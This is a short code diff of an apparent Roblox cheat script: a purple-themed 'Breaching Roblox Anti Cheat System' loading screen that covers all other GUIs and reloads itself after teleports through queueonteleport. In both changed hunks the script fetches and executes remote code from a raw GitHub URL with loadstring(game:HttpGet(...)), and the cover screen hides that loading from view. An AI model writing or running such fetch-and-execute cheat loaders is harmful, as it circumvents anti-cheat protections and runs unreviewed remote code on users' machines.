@@ -1,7 +1,7 @@
 -- Q-Themed "Breaching Roblox Anti Cheat System" Aesthetic Loading Cover + Hub Loader (Persistent)
 -- Covers all GUIs, animated, stays on top, persists through teleports, professional/futuristic purple theme
 
-local hubLoader = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/zanji-official/growagarden/refs/heads/main/script2", true))()'
+local hubLoader = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/zanji-official/growagarden/refs/heads/main/script2"))()'
 
 local coverScript = [[
 local function showQBreachingCover()
@@ -235,7 +235,7 @@ if queueonteleport then
 end
 
 pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/zanji-official/growagarden/refs/heads/main/script2", true))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/zanji-official/growagarden/refs/heads/main/script2"))()
 end)
 
 local function showQBreachingCover()
